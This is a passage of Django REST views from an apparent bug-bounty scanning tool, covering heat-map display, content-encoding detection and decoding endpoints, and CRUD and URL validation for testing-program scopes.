    from scanner.models import HeatMapScan

    context = {'scan': None, 'hotspots': [], 'summary': {}}

    if scan_id:
        try:
            heat_scan = HeatMapScan.objects.prefetch_related('hotspots').get(id=scan_id)
            context['scan'] = heat_scan
            context['hotspots'] = list(heat_scan.hotspots.all())
            context['summary'] = heat_scan.summary
        except HeatMapScan.DoesNotExist:
            pass

    return render(request, 'scanner/heat_map.html', context)


# ---------------------------------------------------------------------------
# Content Encoding views
# ---------------------------------------------------------------------------

@api_view(['POST'])
@permission_classes([AllowAny])
def detect_encoding(request):
    """
    Detect encoding types present in the given content.

    POST body: { "content": "<encoded string>" }

    Returns: { "content": "...", "detected_encodings": [...] }
    """
    from scanner.content_encoding_detector import ContentEncodingDetector

    content = request.data.get('content', '')
    if not content:
        return Response({'error': 'content is required'}, status=400)

    detector = ContentEncodingDetector()
    detected = detector.detect_encoding(content)
    return Response({
        'content': content,
        'detected_encodings': detected,
    }, status=200)


@api_view(['POST'])
@permission_classes([AllowAny])
def decode_content_view(request):
    """
    Decode content using the specified or auto-detected encoding.

    POST body: {
        "content": "<encoded string>",
        "encoding_type": "base64"   // optional; if omitted, auto-detect
    }

    Returns: { original, encoding, decoded, depth, interesting }
    """
    from scanner.content_encoding_detector import ContentEncodingDetector

    content = request.data.get('content', '')
    if not content:
        return Response({'error': 'content is required'}, status=400)

    detector = ContentEncodingDetector()
    encoding_type = request.data.get('encoding_type', '').strip()

    if encoding_type:
        decoded = detector.decode_content(content, encoding_type)
        return Response({
            'original': content,
            'encoding': encoding_type,
            'decoded': decoded,
            'depth': 1,
            'interesting': detector.is_interesting(decoded),
        }, status=200)

    result = detector.auto_decode(content)
    return Response(result, status=200)


@api_view(['POST'])
@permission_classes([AllowAny])
def recursive_decode_view(request):
    """
    Recursively decode nested encodings.

    POST body: {
        "content": "<encoded string>",
        "max_depth": 5   // optional
    }

    Returns: { content, steps: [...] }
    """
    from scanner.content_encoding_detector import ContentEncodingDetector

    content = request.data.get('content', '')
    if not content:
        return Response({'error': 'content is required'}, status=400)

    max_depth = int(request.data.get('max_depth', 5))
    detector = ContentEncodingDetector()
    steps = detector.recursive_decode(content, max_depth=max_depth)

    return Response({
        'content': content,
        'steps': steps,
    }, status=200)


@api_view(['POST'])
@permission_classes([AllowAny])
def url_encode_hostname_view(request):
    """
    Return the URL-encoded (percent-encoded) equivalent of a hostname.

    POST body: { "hostname": "example.com" }

    Returns: { hostname, url_encoded }
    """
    from scanner.content_encoding_detector import ContentEncodingDetector

    hostname = request.data.get('hostname', '').strip()
    if not hostname:
        return Response({'error': 'hostname is required'}, status=400)

    detector = ContentEncodingDetector()
    encoded = detector.url_encode_hostname(hostname)
    return Response({'hostname': hostname, 'url_encoded': encoded}, status=200)


# ---------------------------------------------------------------------------
# Program Scope CRUD views
# ---------------------------------------------------------------------------

def _scope_to_dict(scope):
    """Serialize a ProgramScope instance to a dict."""
    return {
        'id': scope.id,
        'name': scope.name,
        'in_scope_domains': scope.in_scope_domains,
        'out_of_scope_domains': scope.out_of_scope_domains,
        'allowed_vulnerability_types': scope.allowed_vulnerability_types,
        'disallowed_vulnerability_types': scope.disallowed_vulnerability_types,
        'max_requests_per_second': scope.max_requests_per_second,
        'testing_window_start': str(scope.testing_window_start) if scope.testing_window_start else None,
        'testing_window_end': str(scope.testing_window_end) if scope.testing_window_end else None,
        'notes': scope.notes,
        'is_active': scope.is_active,
        'created_at': scope.created_at.isoformat(),
        'updated_at': scope.updated_at.isoformat(),
    }


@api_view(['GET', 'POST'])
@authentication_classes([TokenAuthentication, SessionAuthentication])
@permission_classes([IsAuthenticated])
def program_scope_list(request):
    """List all program scopes or create a new one."""
    if request.method == 'GET':
        scopes = ProgramScope.objects.all()
        return Response([_scope_to_dict(s) for s in scopes], status=200)

    # POST — create a new scope
    data = request.data
    name = data.get('name', '').strip()
    if not name:
        return Response({'error': 'name is required'}, status=400)

    list_fields = ['in_scope_domains', 'out_of_scope_domains', 'allowed_vulnerability_types', 'disallowed_vulnerability_types']
    for field in list_fields:
        if field in data and not isinstance(data[field], list):
            return Response({'error': f'{field} must be a list'}, status=400)

    scope = ProgramScope.objects.create(
        name=name,
        in_scope_domains=data.get('in_scope_domains', []),
        out_of_scope_domains=data.get('out_of_scope_domains', []),
        allowed_vulnerability_types=data.get('allowed_vulnerability_types', []),
        disallowed_vulnerability_types=data.get('disallowed_vulnerability_types', []),
        max_requests_per_second=data.get('max_requests_per_second'),
        testing_window_start=data.get('testing_window_start'),
        testing_window_end=data.get('testing_window_end'),
        notes=data.get('notes', ''),
        is_active=bool(data.get('is_active', True)),
    )
    return Response(_scope_to_dict(scope), status=201)


@api_view(['GET', 'PUT', 'DELETE'])
@authentication_classes([TokenAuthentication, SessionAuthentication])
@permission_classes([IsAuthenticated])
def program_scope_detail(request, scope_id):
    """Retrieve, update or delete a specific program scope."""
    try:
        scope = ProgramScope.objects.get(id=scope_id)
    except ProgramScope.DoesNotExist:
        return Response({'error': 'ProgramScope not found'}, status=404)

    if request.method == 'GET':
        return Response(_scope_to_dict(scope), status=200)

    if request.method == 'PUT':
        data = request.data
        list_fields = ['in_scope_domains', 'out_of_scope_domains', 'allowed_vulnerability_types', 'disallowed_vulnerability_types']
        for field in list_fields:
            if field in data and not isinstance(data[field], list):
                return Response({'error': f'{field} must be a list'}, status=400)

        name = data.get('name', scope.name)
        if 'name' in data and not str(name).strip():
            return Response({'error': 'name must not be empty'}, status=400)

        scope.name = name
        scope.in_scope_domains = data.get('in_scope_domains', scope.in_scope_domains)
        scope.out_of_scope_domains = data.get('out_of_scope_domains', scope.out_of_scope_domains)
        scope.allowed_vulnerability_types = data.get('allowed_vulnerability_types', scope.allowed_vulnerability_types)
        scope.disallowed_vulnerability_types = data.get('disallowed_vulnerability_types', scope.disallowed_vulnerability_types)
        scope.max_requests_per_second = data.get('max_requests_per_second', scope.max_requests_per_second)
        scope.testing_window_start = data.get('testing_window_start', scope.testing_window_start)
        scope.testing_window_end = data.get('testing_window_end', scope.testing_window_end)
        scope.notes = data.get('notes', scope.notes)
        scope.is_active = bool(data.get('is_active', scope.is_active))
        scope.save()
        return Response(_scope_to_dict(scope), status=200)

    # DELETE
    scope.delete()
    return Response({'message': 'ProgramScope deleted'}, status=204)


@api_view(['POST'])
@authentication_classes([TokenAuthentication, SessionAuthentication])
@permission_classes([IsAuthenticated])
def program_scope_validate(request, scope_id):
    """
    Validate a URL against a specific program scope.

    POST body: { "url": "https://example.com", "vulnerability_types": ["xss", "sqli"] }

    Returns validation result with is_valid, violations, and warnings.
    """
    try:
        scope = ProgramScope.objects.get(id=scope_id)
    except ProgramScope.DoesNotExist:
        return Response({'error': 'ProgramScope not found'}, status=404)

    url = request.data.get('url', '').strip()
    if not url:
        return Response({'error': 'url is required'}, status=400)

    vuln_types = request.data.get('vulnerability_types', [])
    validator = ScopeValidator(url, scope)
    result = validator.validate(requested_vuln_types=vuln_types if vuln_types else None)
    return Response(result, status=200)
